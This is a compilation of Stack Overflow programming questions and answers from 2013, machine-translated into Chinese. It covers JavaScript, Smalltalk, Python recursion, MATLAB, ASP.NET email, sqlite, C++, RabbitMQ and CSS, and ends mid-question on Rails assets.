# javascript - 拉斐尔饼图标签：如何添加文本

> ID：15163037
> 
> 赞同：0
> 
> 时间：2013-03-01T17:05:09.067
> 
> 标签：javascript, jquery

[使用http://raphaeljs.com/pie.html](http://raphaeljs.com/pie.html)上的基本饼图示例，我正在尝试将值添加到标签中。因此，它现在将读取“Ruby 40%”，而不是读取“Ruby”。

通过更改 js 中的一行，我可以轻松添加值：

```
labels.push($("th", this).text()); 
```

更改为：

```
labels.push($("th, td", this).text()); 
```

问题是，这会一个接一个地返回标签和值，所以我得到：“Ruby40%”。

如何在两者之间添加空格或破折号？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:34:53.563

Not the cleanest answer, but I think you need to add a bit more logic to your code to make it do that:

```
var label ="";
$("th, td").each(function(){
    label += $(this).text() + " ";
 }
);
labels.push(label); 
```

Hope this helps!

# exception - 非布尔接收器——追求真理

> ID：15163038
> 
> 赞同：2
> 
> 时间：2013-03-01T17:05:16.410
> 
> 标签：exception, smalltalk

我有一个 smalltalk 方法：

```
isInvalid
    |tmp|
    tmp := super isInvalid.
    tmp ifTrue: [^ True].
    ^ instanceVar isNil. 
```

我遇到了一个异常：`Unhandled exception: NonBoolean receiver--proceed for truth`对 temp 的分配抛出了异常。我很确定它`super isInvalid`返回一个布尔对象，所以我想我误解了这个异常的含义。有没有其他人碰巧知道？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T17:16:53.483

很久以前，a 全职在 Smalltalk 工作。很高兴看到它还活着...

我在您的代码中看到以下错误：

*   您使用 value 作为返回值`True`，它是（在 Smalltalk 中）只有 value 的类`true`。
*   您必须使用值`true`，它是 Smalltalk 的 VM 中的（我认为）预定义对象之一，它们是`true`, `false`, `nil`.
*   一个更好的解决方案是：

    ```
    ^ super isInvalid or: [instanceVar isNil] 
    ```

    这将用布尔表达式替换整个正文或您的消息（始终是`true`or `false`，没有错误的可能性）。（感谢 Fabian 提供正确的方法`or:`。）

所以使用正确的返回值，错误信息就会消失。

顺便说一句，错误消息`Unhandled exception: NonBoolean receiver--proceed for truth`是某种调试帮助，它允许您继续，以便您能够更快地开发......再也没有用任何其他语言看到过......

# java - StringTemplate 没有找到 getter

> ID：15163042
> 
> 赞同：3
> 
> 时间：2013-03-01T17:05:32.580
> 
> 标签：java, stringtemplate, stringtemplate-4

我正在使用 ST-4.0.7.jar，我的模板如下所示：

```
backtrack_result(btresult) ::=<<
    <backtrack-result>
        <pattern id="$btresult.pattern.id$">$btresult.pattern.description$</pattern>
        <file>$btresult.file.file.path$</file>
        <line>$btresult.codeline.lineNr$</line>
        <method>$btresult.codeline.method.name$</method>        
    </backtrack-result>
>> 
```

但是，当我查看我的输出文件时，我得到了

```
<method></method> 
```

在 BTResult 中：

```
public CodeLineInterface getCodeline() {
    return cl;
} 
```

在代码行中：

```
public MethodInterface getMethod() {
    return method;
} 
```

在方法中：

```
public String getName() {
    return name;
} 
```

我在 getMethod 方法的代码行对象中设置了一个断点，它从未被调用过。所以我得出结论，不知何故 stringtemplate 在解析正确的 getter 时存在问题。

我添加了一个 STErrorListener 发现 ST 抛出以下错误：

```
STReportGenerator  - context [/report /backtrack_results /backtrack_result] 5:19 no such property or can't access: ju.no.need.toknow.BTResult.method
Caused by: org.stringtemplate.v4.misc.STNoSuchPropertyException: no such property: ju.no.need.toknow.BTResult.method
    at org.stringtemplate.v4.misc.ObjectModelAdaptor.throwNoSuchProperty(ObjectModelAdaptor.java:106)
    at org.stringtemplate.v4.misc.ObjectModelAdaptor.lookupMethod(ObjectModelAdaptor.java:99)
    at org.stringtemplate.v4.misc.ObjectModelAdaptor.getProperty(ObjectModelAdaptor.java:67)
    at org.stringtemplate.v4.Interpreter.getObjectProperty(Interpreter.java:1158) 
```

对此我特别困惑的是：当模板说它应该得到 btresult 时，为什么它会尝试解析为 BTReult.method。**代码行.method.name**？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T12:27:24.130

好的。这是我自己的愚蠢：虽然我确实修复了我的模板，但代码实际上使用了一个旧模板，所以在我看来，我的所有修复都不起作用。OSI 第 8 层问题 ;-)

# python - 使用递归函数反转字符串列表

> ID：15163045
> 
> 赞同：0
> 
> 时间：2013-03-01T17:05:50.747
> 
> 标签：python, recursion, python-3.x

我正在尝试使用递归函数来反转列表。不幸的是，我对递归还很陌生。这可能吗？到目前为止，这是我的代码

```
def stringRev (word):
    worLen = len(word)
    if worLen == 1:
        return word
    return (word[-1]) + stringRev(word[:-1])

listWord = ["hey", "there", "jim"]
print(stringRev(listWord)) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T17:14:49.070

你的问题是这`(word[-1])`是一个字符串，而不是一个列表。所以你正在尝试添加/连接一个字符串和一个列表。我将该表达式更改`[word[-1]]`为创建一个列表。

```
>>> def stringRev (word):
...     worLen = len(word)
...     if worLen == 1:
...         return word
...     return [word[-1]] + stringRev(word[:-1])
... 
>>> listWord = ["hey", "there", "jim"]
>>> print(stringRev(listWord))
['jim', 'there', 'hey']
>>> 
```

PS。如果您包含运行代码时收到的错误，这将很有帮助：`TypeError: Can't convert 'list' object to str implicitly`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T17:06:59.043

要反转列表元素的顺序，请更改：

```
return (word[-1]) + stringRev(word[:-1]) 
```

至

```
return [word[-1]] + stringRev(word[:-1]) 
```

（注意方括号）。

问题是您试图将字符串 ( `word[-1]`) 与列表 ( `word[:-1]`) 连接起来。

 ~~问题是您的函数需要一个单词，但您使用单词*列表*调用它。

如果你按如下方式调用它，你会发现它工作得很好：

```
for word in ["hey", "there", "jim"]:
    print(stringRev(word)) 
```

或者，如果您希望将反转的字符串存储在列表中：

```
l = [stringRev(w) for w in ["hey", "there", "jim"]] 
```

~~函数失败的一个极端情况是空字符串。我不知道这是否是一个有效的输入，所以它可能不是问题（但修复起来微不足道）。~~

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T17:10:13.617

如果你想在 Python 中完成：

```
reversed(listWord) 
```

假设 word 是一个列表或一个元组

[http://docs.python.org/2/library/functions.html#reversed](http://docs.python.org/2/library/functions.html#reversed)

并获得一份清单：

```
list(reversed(listWord)) 
```

应该管用

但是如果你想要一个算法，我猜 reversed 不是你的朋友！~~

# matlab - Matlab - 创建高斯滤波器的参数

> ID：15163051
> 
> 赞同：0
> 
> 时间：2013-03-01T17:06:05.163
> 
> 标签：matlab

我正在尝试在一个循环中创建多个高斯滤波器，如下所示：

```
for sigma:3:0.4:15
    filter = fspecial('gaussian', 6*sigma, sigma);
end 
```

它不喜欢我将浮点数传递给 size 参数，并给我以下错误：

```
Expected input number 2, N, to be integer-valued. 
```

但是当我将代码行更改为：

```
filter = fspecial('gaussian', uint8(6*sigma), sigma); 
```

我收到此错误：

```
Expected input number 2, N, to be one of these types:
double
Instead its type was uint8. 
```

我完全困惑，任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:17:07.493

[文档](http://www.mathworks.fr/fr/help/images/ref/fspecial.html)暗示如果第一个参数是`fspecial`，`'gaussian'`第二个参数是一个整数。这并不意味着参数的预期类型有任何含义，只是它必须是一个四舍五入的数字。

从您的第二次尝试和由此产生的错误中，我了解到第二个参数的预期类型是`double`.

因此，您正在查找的命令应该类似于

```
filter = fspecial('gaussian', floor(6*sigma), sigma); 
```

or something close (see the [floor function documentation](http://www.mathworks.fr/fr/help/matlab/ref/floor.html) for alternative functions to round real numbers to integers).

# listview - jQuery Mobile 设置 ListView 的属性

> ID：15163052
> 
> 赞同：0
> 
> 时间：2013-03-01T17:06:10.747
> 
> 标签：listview, jquery-mobile, attributes

'你好 StackOverflowers。

所以这是我的场景：我填充了一个`ListView`using `localStorage`. 一切都在填充该列表视图并“刷新”它。但！

现在我想添加一个搜索栏，如果超过 5 个元素添加到`ListView`. 这是我当前的代码（不起作用）：

```
if (resultLength > 5)
{
    // alert('5 or more elemnts found.');
    $("#ConnectionList").attr("data-filter", true);
    $("#ConnectionList").attr("data-filter-placeholder", "Search...");
} 
```

当我取消注释时`alert`，它会正确触发。在两条线后面添加`.listview('refresh')`似乎也不起作用。

我究竟做错了什么？

先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:58:36.300

不幸的是，这行不通。**`jQuery Mobile`**将无法将过滤器动态添加到现有列表视图。

但是有一个解决方法。在填充列表视图之前，您尝试填充的元素数量，如果数字为 5 或更多，请删除当前列表视图并在同一位置添加新的列表视图。这是另一件奇怪的事情，如果您从头开始创建列表视图（考虑过滤器），过滤器将成功生成。

我为你做了一个例子：http: [//jsfiddle.net/Gajotres/SS7vJ/](http://jsfiddle.net/Gajotres/SS7vJ/)

```
$(document).on('pagebeforeshow', '#index', function(){       
    $('<ul>').attr({'id':'test-listview','data-role':'listview', 'data-filter':'true','data-filter-placeholder':'Search...'}).appendTo('#index [data-role="content"]');
    $('<li>').append('<a href="#">Audi</a>').appendTo('#test-listview');
    $('<li>').append('<a href="#">Mercedes</a>').appendTo('#test-listview');
    $('<li>').append('<a href="#">Opel</a>').appendTo('#test-listview');
    $('#test-listview').listview().listview('refresh');
}); 
```

也不要忘记调用 .listview( 两次，第一次没有刷新参数，第二次使用刷新参数。没有它你会收到这个错误：

```
cannot call methods on listview prior to initialization 
```

**[你可以在这篇文章](http://www.gajotres.net/jquery-mobile-and-how-to-enhance-the-markup-of-dynamically-added-content/)**中找到更多关于这个问题的信息，为了透明，这是我的个人博客。或者在**[这里](https://stackoverflow.com/a/14550417/1848600)**找到它。查找名为：**标记增强问题**的章节。

# asp.net - 如何在 ASP.NET Web 窗体应用程序中使用类文件？

> ID：15163057
> 
> 赞同：0
> 
> 时间：2013-03-01T17:06:43.123
> 
> 标签：asp.net, class

我有一个想在我的 Web 表单应用程序上使用的类文件。这是我在网上找到的一个。我已将它放在 App_Code 文件夹中，并尝试在活动中使用它

```
protected void sendBtn_Click(object sender, EventArgs e)
        {

        } 
```

类文件：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

public class SendEmail
{
    public void SendMailMessage(string from, string to, string bcc, string cc, string subject, string body)
    {
        // Instantiate a new instance of MailMessage
        MailMessage mMailMessage = new MailMessage();

        // Set the sender address of the mail message
        mMailMessage.From = new MailAddress(from);
        // Set the recepient address of the mail message
        mMailMessage.To.Add(new MailAddress(to));

        // Check if the bcc value is null or an empty string
        if ((bcc != null) && (bcc != string.Empty))
        {
            // Set the Bcc address of the mail message
            mMailMessage.Bcc.Add(new MailAddress(bcc));
        }      // Check if the cc value is null or an empty value
        if ((cc != null) && (cc != string.Empty))
        {
            // Set the CC address of the mail message
            mMailMessage.CC.Add(new MailAddress(cc));
        }       // Set the subject of the mail message
        mMailMessage.Subject = subject;
        // Set the body of the mail message
        mMailMessage.Body = body;

        // Set the format of the mail message body as HTML
        mMailMessage.IsBodyHtml = true;
        // Set the priority of the mail message to normal
        mMailMessage.Priority = MailPriority.Normal;

        // Instantiate a new instance of SmtpClient
        SmtpClient mSmtpClient = new SmtpClient();
        // Send the mail message
        mSmtpClient.Send(mMailMessage);
    }
} 
```

我无法访问这些方法并尝试了以下方法：

```
SendEmail send = new SendEmail();

var send = new SendEmail();

SendEmail.SendMailMessage

using SendEmail 
```

这一切都无济于事。

我是一个绝对的初学者

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-17T17:50:10.193

在您执行任何其他操作之前，您需要将 System.Net.Mail 命名空间添加到您的 SendEmail 类文件中。

这会让你——

```
using System.Net.Mail;

public class SendEmail
{
    public void SendMailMessage(string from, string to, string bcc, string cc, string subject, string body)
    {
        // Instantiate a new instance of MailMessage
        MailMessage mMailMessage = new MailMessage();

        // Set the sender address of the mail message
        mMailMessage.From = new MailAddress(from);
        // Set the recepient address of the mail message
        mMailMessage.To.Add(new MailAddress(to));

        // Check if the bcc value is null or an empty string
        if ((bcc != null) && (bcc != string.Empty))
        {
            // Set the Bcc address of the mail message
            mMailMessage.Bcc.Add(new MailAddress(bcc));
        }      // Check if the cc value is null or an empty value
        if ((cc != null) && (cc != string.Empty))
        {
            // Set the CC address of the mail message
            mMailMessage.CC.Add(new MailAddress(cc));
        }       // Set the subject of the mail message
        mMailMessage.Subject = subject;
        // Set the body of the mail message
        mMailMessage.Body = body;

        // Set the format of the mail message body as HTML
        mMailMessage.IsBodyHtml = true;
        // Set the priority of the mail message to normal
        mMailMessage.Priority = MailPriority.Normal;

        // Instantiate a new instance of SmtpClient
        SmtpClient mSmtpClient = new SmtpClient();
        // Send the mail message
        mSmtpClient.Send(mMailMessage);
    }
} 
```

不需要其中的其他“使用”，默认情况下这些是由 Visual Studio 添加的，但实际上并未在类中使用。

然后你可以简单地在你的页面中使用以下内容-

```
protected void sendBtn_Click(object sender, EventArgs e)
{
    SendEmail send = new SendEmail();

    send.SendMailMessage("from@domain.com", "to@domain.com", null, null, "Test e-mail", "Test e-mail");
} 
```

我怀疑你的课程没有编译是什么让你绊倒了。上面的代码都是在示例项目中构建的，没有问题。

尽管这超出了问题的范围，但我很想将帮助程序类设为静态，这样您就不必一直实例化 SendEmail 的新副本。

有关 using 指令的更多详细信息，请参阅[http://msdn.microsoft.com/en-us/library/dfb3cx8s.aspx](http://msdn.microsoft.com/en-us/library/dfb3cx8s.aspx)和[http://msdn.microsoft.com/en-us/library/sf0df423.aspx](http://msdn.microsoft.com/en-us/library/sf0df423.aspx)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-14T15:41:46.947

我想推荐这些：

1.  将命名空间添加到您的类文件中。使用 System.Net.Mail；

2.  在调用函数 (SendMailMessage) 时提供参数。

3.  将 SendMail 类设为静态类，将 SendMailMessage 设为静态函数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T20:23:36.643

将您的类文件更改为：

```
namespace MyCompany
{
     public class SendEmail
     {
          //Class properties and methods here.
     }
} 
```

然后在你的 web 表单代码后面，添加：

```
using MyCompany; 
```

以下是有关[使用命名空间](http://msdn.microsoft.com/en-us/library/dfb3cx8s.aspx)的更多信息，您可能会发现这些信息对您有所帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T17:14:43.120

将您的类文件放在调用代码所在的同一文件夹中`sendBtn_Click`。如果带有处理程序的代码在顶部某处有一行写着`namespace SomeNamespace {`，请确保您复制的类文件也具有相同的行。您的花括号可能会有所不同。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T20:10:25.410

一般来说，我会在你的 Visual Studio 解决方案中创建一个单独的“库”项目，并从你的主网站项目中引用它。

您的新 SendMail 类将进入其中。

有时您似乎只需要一些帮助类，但数量会随着时间的推移而增长。随着项目的发展，将事物分开也有助于编译速度/组织。

# android - Bugsense 不发送崩溃报告

> ID：15163062
> 
> 赞同：1
> 
> 时间：2013-03-01T17:06:53.430
> 
> 标签：android, bugsense

我刚刚在我的 android 应用程序中实现了 bugsense 3.2 库，然后才发布给客户端进行测试。我的应用程序处于测试阶段。为了测试崩溃报告，我特意在我的活动中加入了崩溃代码。

```
BugSenseHandler.initAndStartSession(MainActivity.this, "MY_KEY"); // MY_KEY is replaced with actual key
String a = null;
a.toString(); 
```

应用程序按预期崩溃，但我没有收到任何关于我注册的电子邮件 ID 的崩溃报告。我的问题是，bugsense 需要多长时间才能报告崩溃？还是我做错了什么。

我已给予必要的互联网许可。

`<uses-permission android:name="android.permission.INTERNET" />`

请帮忙，我的客户正在失去耐心，因为他在应用程序中遇到了一些我无法找到的崩溃。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-02T15:48:03.273

我是 Kostas，BugSense 插件的 Android 开发者。首先，请确保您的 API 密钥正确。您还可以使用一个调试选项，您可以使用 BugSenseHandler.I_WANT_TO_DEBUG = true 启用它；就在初始化之前。这会告诉你哪里出了问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:30:20.773

> bugsense 报告崩溃需要多长时间？

我在我的项目中使用 bugsense 在 bugsense 的 web 面板上发送 logcat。它会立即显示 logcat 并确保手机已连接到互联网。

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    BugSenseHandler.initAndStartSession(Context, APIKEY);
    setContentView(R.layout.main);
    //rest of your code here
} 
```

请检查您在此处使用的 API 密钥是否正确。

您有多种选择来获取 logcat。

要获取错误跟踪，您可以使用[Application Crash Report for Android](http://code.google.com/p/acra/)。

或者

我在 github 上有一个项目，可以在开发人员电子邮件帐户上发送错误跟踪。

从[这里](https://github.com/ajaysaini-sgvu/CrashReport)下载。

# database - 如何从命令行工具计算sqlite中的列数

> ID：15163065
> 
> 赞同：3
> 
> 时间：2013-03-01T17:07:02.620
> 
> 标签：database, sqlite

我正在尝试使用 sqlite 命令行工具从 sqlite db 中计算列。为了测试它，我创建了一个这样的示例数据库：

```
c:\>sqlite.exe mydb.sqlite "create table tbl1(one varchar(10), two smallint);" 
```

现在可以说我不知道​​表 tbl1 有 2 列，**我如何使用命令行工具的查询找到它？**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T17:10:59.913

跑：

```
pragma table_info(yourTableName) 
```

看：

```
http://www.sqlite.org/pragma.html#pragma_table_info 
```

更多细节。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-25T15:15:26.373

这是我发现在 Linux 下有用的一种方法。创建一个 bash 脚本文件`columns.sh`并确保它具有执行权限并复制 - 粘贴以下代码。

`columns() { for table in $(echo ".tables" | sqlite3 $1); do echo "$table $(echo "PRAGMA table_info($table);" | sqlite3 $1 | wc -l)"; done ;}`

在终端的第一行键入以下命令以返回结果

```
 $  columns <database name>
    <table1>          <# of columns>
    <table2>          <# of columns> 
```

注意：确保数据库没有损坏或加密。

来源：[http ://www.quora.com/SQLite/How-can-I-count-the-number-of-columns-in-a-table-from-the-shell-in-SQLite](http://www.quora.com/SQLite/How-can-I-count-the-number-of-columns-in-a-table-from-the-shell-in-SQLite)

**更新**

这是 Python 脚本解决方案的有趣 URL

[http://pagehalffull.wordpress.com/2012/11/14/python-script-to-count-tables-columns-and-rows-in-sqlite-database/](http://pagehalffull.wordpress.com/2012/11/14/python-script-to-count-tables-columns-and-rows-in-sqlite-database/)

# c++ - 打印字符串数组的第一个/最后一个元素时出现问题

> ID：15163067
> 
> 赞同：0
> 
> 时间：2013-03-01T17:07:04.687
> 
> 标签：c++, arrays, string, getline

只是想知道是否有人可以帮助我解决我遇到的这个问题，程序总是由于某种原因崩溃，我不知道为什么。我还是 C++ 的新手，所以，是的。

**它应该做什么：**

1.  创建一个包含 5 个可能元素的字符串数组。
2.  从用户那里获取 5 个名字（名字和姓氏）
3.  打印字符串数组的第一个和最后一个元素
4.  创建一个字符串并让用户为该字符串分配一个句子。
5.  打印来自 (4) 的字符串

步骤 4,5 很简单，但我真的不知道如何在步骤 3 中显示字符串的最后一个元素。

```
int x;
string n1,n2,n3,n4,n5,user;
string array[5]={n1,n2,n3,n4,n5};

cout<<"Enter 5 names: "<<endl;

getline(cin,n1);
getline(cin,n2);
getline(cin,n3);
getline(cin,n4);
getline(cin,n5);

cout<<endl;

for(x=0;x<5;x++)
{
    int y=array[x].length();
    cout<<array[x].substr(0,1)<<"\t"<<array[x].substr(y,1)<<endl;
}

cout<<endl;
cout<<"Enter sentence for string: "<<endl;
getline(cin,user);
cout<<user<<endl;

system("pause");
return 0; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:15:22.157

与说 java 不同，以下创建了 5 个不同的 std::string 副本。所以分配给 n1 不会影响 array[0]

```
 string n1,n2,n3,n4,n5,user;
 string array[5]={n1,n2,n3,n4,n5}; 
```

做你所追求的“正确”方法是这样的

```
std::vector<std::string> array(5);

std::cout << "Enter 5 names: " << std::endl;

for(std::size_t x=0;x<array.size();x++) {
    std::getline(std::cin, array[i]);
} 
```

我已经将原始数组换成了向量，几乎在所有情况下都应该优先于数组。

[http://en.cppreference.com/w/cpp/container/vector](http://en.cppreference.com/w/cpp/container/vector)

# block - rabbitmq 连接阻塞，但内存是水印

> ID：15163068
> 
> 赞同：2
> 
> 时间：2013-03-01T17:07:12.693
> 
> 标签：block, rabbitmq, watermark, flow

我们在我们的应用程序中使用rabbitmq，两个小时前，我们的一个应用服务器在尝试连接rabbitmq时被阻塞，检查rabbitmq服务器后，我们发现一个节点的内存超过了水印，几分钟后，这个节点关闭了。重启这个节点后，整个集群工作正常，但是我注意到有很多连接处于阻塞和阻塞状态，但 `rabbitmqctl list_connections pid name peer_address state`在所有节点中使用显示没有连接处于阻塞/阻塞状态……所以这真的让我很困惑：

1.  整个集群的一个节点超过水印后，但其他节点工作正常，我的应用程序无法连接到rabbitmq集群？ps：我们使用 spring.amqp 和 spring-rabbit 版本 1.1.0.RELEASE
2.  超过水印时节点会因什么原因而关闭？
3.  为什么重启节点后，仍然有阻塞连接，但是使用rabbitmqctl它们都处于运行状态？

这是来自我的 rabbitmq 服务器的一些日志：

```
=INFO REPORT==== 1-Mar-2013::19:36:21 ===
vm_memory_high_watermark clear. Memory used:1656590680 allowed:1658778419

=INFO REPORT==== 1-Mar-2013::19:36:21 ===
alarm_handler: {clear,{resource_limit,memory,rabbit@cos22}} 
```

当我尝试从 Web 管理关闭被阻止的连接时，出现错误：

```
=INFO REPORT==== 1-Mar-2013::20:55:24 ===
Closing connection <0.17197.115> because "Closed via management plugin"

=ERROR REPORT==== 1-Mar-2013::20:55:24 ===
webmachine error: path="/api/connections/10.64.13.200%3A45891%20-%3E%2010.64.12.226%3A5672"
{throw,
{error,{not_a_connection_pid,<0.17197.115>}},
[{rabbit_networking,close_connection,2,
     [{file,"src/rabbit_networking.erl"},{line,317}]},
 {rabbit_mgmt_wm_connection,delete_resource,2,
     [{file,"rabbitmq-management/src/rabbit_mgmt_wm_connection.erl"},
      {line,52}]},
 {webmachine_resource,resource_call,3,
     [{file,
          "webmachine-wrapper/webmachine-git/src/webmachine_resource.erl"},
      {line,169}]},
 {webmachine_resource,do,3,
     [{file,
          "webmachine-wrapper/webmachine-git/src/webmachine_resource.erl"},
      {line,128}]},
 {webmachine_decision_core,resource_call,1,
     [{file,
          "webmachine-wrapper/webmachine-git/src/webmachine_decision_core.erl"},
      {line,48}]},
 {webmachine_decision_core,decision,1,
     [{file,
          "webmachine-wrapper/webmachine-git/src/webmachine_decision_core.erl"},
      {line,416}]},
 {webmachine_decision_core,handle_request,2,
     [{file,
          "webmachine-wrapper/webmachine-git/src/webmachine_decision_core.erl"},
      {line,33}]},
 {rabbit_webmachine,'-makeloop/1-fun-0-',3,
     [{file,"rabbitmq-mochiweb/src/rabbit_webmachine.erl"},{line,75}]}]} 
```

使用 rabbitmqctl 显示全部处于运行状态：

```
rabbitmqctl list_connections pid name peer_address state
Listing connections ...
<rabbit@cos23.1.1271.51>        10.64.13.197:57321 -> 10.64.12.225:5672 10.64.13.197    running
<rabbit@cos23.1.1100.51>        10.64.13.196:57240 -> 10.64.12.225:5672 10.64.13.196    running
<rabbit@cos23.1.1056.51>        10.64.12.196:58608 -> 10.64.12.225:5672 10.64.12.196    running
<rabbit@cos23.1.1079.51>        10.64.11.235:48962 -> 10.64.12.225:5672 10.64.11.235    running
<rabbit@cos23.1.1419.51>        10.64.13.228:49857 -> 10.64.12.225:5672 10.64.13.228    running
<rabbit@cos23.1.1049.51>        10.64.11.193:36387 -> 10.64.12.225:5672 10.64.11.193    running
<rabbit@cos23.1.1159.51>        10.64.10.123:52017 -> 10.64.12.225:5672 10.64.10.123    running
<rabbit@cos23.1.26289.45>       10.64.12.247:38504 -> 10.64.12.225:5672 10.64.12.247    running
<rabbit@cos23.1.1121.51>        10.64.10.29:51483 -> 10.64.12.225:5672  10.64.10.29     running
<rabbit@cos23.1.1067.51>        10.64.11.234:50244 -> 10.64.12.225:5672 10.64.11.234    running
<rabbit@cos23.1.1149.51>        10.64.11.178:33795 -> 10.64.12.225:5672 10.64.11.178    running
<rabbit@cos23.1.1136.51>        10.64.10.28:39557 -> 10.64.12.225:5672  10.64.10.28     running
<rabbit@cos23.1.1370.51>        10.64.13.233:38766 -> 10.64.12.225:5672 10.64.13.233    running
<rabbit@cos23.1.1388.51>        10.64.13.229:50932 -> 10.64.12.225:5672 10.64.13.229    running
<rabbit@cos23.1.1254.51>        10.64.13.241:49311 -> 10.64.12.225:5672 10.64.13.241    running
<rabbit@cos23.1.1031.51>        10.64.11.195:39455 -> 10.64.12.225:5672 10.64.11.195    running
<rabbit@cos23.1.1038.51>        10.64.10.27:58938 -> 10.64.12.225:5672  10.64.10.27     running
<rabbit@cos23.1.1167.51>        10.64.13.240:37777 -> 10.64.12.225:5672 10.64.13.240    running
<rabbit@cos23.1.1442.51>        10.64.10.130:37251 -> 10.64.12.225:5672 10.64.10.130    running
<rabbit@cos22.3.2659.0> 10.64.13.200:54840 -> 10.64.12.226:5672 10.64.13.200    running
...done. 
```

并且有很多通道处于阻塞状态的连接，但我无法使用rabbitctl list_connections找到这个连接：

```
AMQP 0-9-1  
10.64.13.200:45891 -> 10.64.12.226:5672
rabbit@cos22    0B/s
(49.2MB total)
0B/s
(2.4MB total)
0s  60920 
```

非常感谢任何帮助和建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-17T09:21:12.253

从 rabbitmq 邮件列表中得到了答案：

> 这些连接/通道不存在。您在管理插件中看到了一个错误，它将保留有关在集群节点崩溃时处于活动状态的连接和通道的信息。
> 
> 此错误已在 RabbitMQ 3.0.3 中修复。

# css - 带有星号的列表项

> ID：15163071
> 
> 赞同：5
> 
> 时间：2013-03-01T17:07:15.893
> 
> 标签：css

是否可以在有序列表中增加星号？所以如果我有类似的东西

```
<ol class="ast">
<li>item 1</li> 
<li>item 2</li> 
<li>item 3</li> 
</ol> 
```

这将显示在我的页面上，如下所示

* 项目 1
** 项目 2
*** 项目 3

使用 CSS 吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:22:47.253

可以，但您必须取消列表 ( `list-style:none`) 的样式并使用“before:”伪类来绝对定位您的星号，并结合`n-th`child 来设置星号的数量。

像这样的东西，但你必须稍微调整一下。

```
ul, li {
   margin:0;
   padding:0;
  list-style:none      
}

li {
   padding-left:20px; 
}

li:nth-child(1):before {
   content: "*" 
}

li:nth-child(2):before {
   content: "**" 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-04-06T18:39:17.050

CSS`symbols()`功能允许您创建类似于您正在寻找的东西。

请参阅[https://developer.mozilla.org/en-US/docs/Web/CSS/symbols](https://developer.mozilla.org/en-US/docs/Web/CSS/symbols)。

一个示例是对列表进行样式设置，例如：

```
ol {
  list-style: symbols(symbolic "*");
} 
```

虽然上面的代码会像您想要的那样自动增加每个星号的数量，但星号`<li>`的数量会向左增长，而不是像您所追求的那样向右增长。

此外，一旦您超过一定数量的列表项，星号的数量将超出您的可用空白空间。[有关此问题的示例，请参阅此演示](http://codepen.io/anon/pen/MYdoYz)。

此外，`symbols()`目前仅在 FireFox 版本 35 或更高版本中受支持。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:30:53.340

我不相信有一种方法可以处理任意深度。Diodeus 的解决方案会以大量 CSS 代码为代价来处理已知的最大深度。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-07-14T10:38:08.127

总会有办法的：

```
ul {
     list-style: "*";
}

li {
     padding-left: 20px;
} 
```

奇迹般有效。

# iphone - External Accessort Framework - 获取连接设备的 MAC 地址

> ID：15163074
> 
> 赞同：3
> 
> 时间：2013-03-01T17:07:19.817
> 
> 标签：iphone, ipad, external-accessory

我是stackoverflow的新手......这是感谢大家的大力支持的好时机！

我有一个问题...我需要获取已连接的 EAAccessory 的 MAC 地址。这个技巧我可以接受：

```
/* accessory is a connected EAAccessory, obviously */
NSString *macAddress = [accessory valueForKey: @"macAddress"]; 
```

我的问题是 iPad1 的配件（可能还有旧的 iphone）没有“macAddress”键……这很奇怪。

有任何想法吗？谢谢

# javascript - Rails javascript 在生产模式下不起作用

> ID：15163075
> 
> 赞同：0
> 
> 时间：2013-03-01T17:07:22.790
> 
> 标签：javascript, ruby-on-rails, assets, dev-to-production

我得到了一个对象，它显示了 Skype 中的图标选择工具栏。图标图像显示正确，但是当我在生产模式下单击图标时，所选图标不会出现在文本中。

我将图标图像 html 放到控制台，发现它与工具栏中所选图像的组成完全一样。我很困惑。怎么了？

**应用程序/资产/javascripts/emoticons.js**

```
function EmoticonsToolbar(jquery_element){
  var e = jquery_element;
  var top  = e.offset().top;  // store toolbar button initial position
  var left = e.offset().left;
  var onIconClick_callback;   // method to insert icon image html in text

  this.hide = function(){
    e.hide();
  };

  // icon click event handler
  this.onIconClick = function(eventObject){
    e.hide();
    var html = $(eventObject.target).parent().html().replace(/\n\s+|\s+\n/g, '');

    console.log(html);
    // html here: '<img title="ru.emoticons. " src="/assets/emoticons/24x24/02-72977ee3c26c7946176e85da16a13c98.png">'
    // that url returnes the image if being typed in address bar

    onIconClick_callback(html);
    eventObject.stopPropagation();
    };

  // show icon selection toolbar above the editor button
  this.attach_to = function(element, callback){
    onIconClick_callback = callback;
    var newTop  = element.offset().top  - top  - 10 - e.height();
    var newLeft = element.offset().left - left + 10;
    e.css({top:newTop, left:newLeft, visibility:'visible'}).show();
    };
}; 
```

这是一个编辑器面板按钮“插入表情”，它显示表情工具栏，并处理所选图标图像的html。

**app/assets/javascripts/control/user/sites/pages.js**

```
function nicEditorEmoticonButton(){   
  var self;
  this.init = function(){
    self = this;
  };

  // Search text input and set focus on it
  var setFocusBackToText = function(){
    $(self.elm).closest('div.widget').find('div.nicEdit-main').focus();
  };

  this.mouseClick = function(eventObject) {
    var paste_icon_html = function(html){
